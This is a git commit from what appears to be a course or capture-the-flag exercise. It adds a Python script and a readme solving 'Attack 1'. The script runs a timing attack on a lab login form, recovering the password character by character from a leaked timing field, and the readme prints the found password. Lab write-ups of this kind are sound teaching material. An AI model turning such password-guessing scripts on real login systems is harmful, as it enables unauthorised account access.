fe6b6fa40180722ba8f52b7bf6381f324d599216
D3faIt <8147434+D3faIt@users.noreply.github.com>
2023-12-08 14:19:02 +0100

    Attack 1 done

--- code/solutions/attack_1/main.py
+++ code/solutions/attack_1/main.py
@@ -1,1 +1,69 @@
 # The Python script for Attack 1 (the public login form)
+
+import json
+import requests
+import string
+import random
+
+url = "https://portal.regjeringen.uiaikt.no/login"
+
+# Define the headers
+headers = {
+    'Content-Type': 'application/json'
+}
+
+# Define the payload
+payload = {}
+
+def gen_password(length, cur_correct_password = None):
+    characters = string.ascii_letters + string.digits
+
+    # Generate the random string
+    if cur_correct_password != None:
+        random_string = ''.join(random.choice(characters) for _ in range(length - len(cur_correct_password)))
+        random_string = cur_correct_password + random_string
+    else:
+        random_string = ''.join(random.choice(characters) for _ in range(length))
+
+    return random_string
+
+found_length = False
+length = 1
+timing = 0
+
+while True:
+
+    if found_length:
+        payload["password"] = gen_password(length, payload["password"][:timing-1])
+    else:
+        payload["password"] = gen_password(length)
+
+    print("Trying password: " + payload["password"])
+
+    # Convert dict to JSON
+    data = json.dumps(payload)
+
+    # Send the POST request
+    response = requests.post(url, headers=headers, data=data, timeout=30)
+
+    # Check the status code
+    if 500 > response.status_code:
+        try:
+            # Try to read the response into a JSON
+            response_json = response.json()
+            total_time = response_json["total_time"]
+            if total_time != timing:
+                timing = total_time
+                found_length = True
+            elif found_length == False:
+                length += 1
+        except:
+            # Handle the case where the response is not a JSON
+            if "Set-Cookie" in response.headers:
+                print("Found password: " + payload["password"])
+                break
+            else:
+                print("Non-JSON response found: ")
+                print(response.text)
+    else:
+        print(f'Request failed with status code {response.status_code}')
--- code/solutions/attack_1/readme.md
+++ code/solutions/attack_1/readme.md
@@ -1,19 +1,16 @@
 # Attack 1 
 
-This attack is related to the login form on regjeringen.uiaikt.no. 
+In this attack we perform a (simulated) timing attack.
+The server will give us the response of how many cycles was performed to check the password.
 
-The form has a timing vulnerability that allows us to guess the password. 
-It does not check the username. 
+The python script we write first figures out the length of the password, then it starts from left to right to insert the correct characters, based of the timing information returned in the response. For each correct character, the timing will go up by 1.
 
-We were able to find the password by manually brute forcing. We first found the length of the password, 
-then tried to replace each character one by one until the number of cycles taken to process the request increased.
+Finally once we get the `set-cookie` header, we know the password is correct.
 
-
-We are given a cookie upon successful login. It has a 'authenticated' value, which is set to true.
-
+2 things to note in this attack. The username is not checked, neither for being set, nor its value. The other thing to note is that it doesn't matter what the last character of the password is.
 
 The solution: 
 ```
 Username: <any>
-Password: KattenMinEKul12
+Password: KattenMinErKul123
 ```
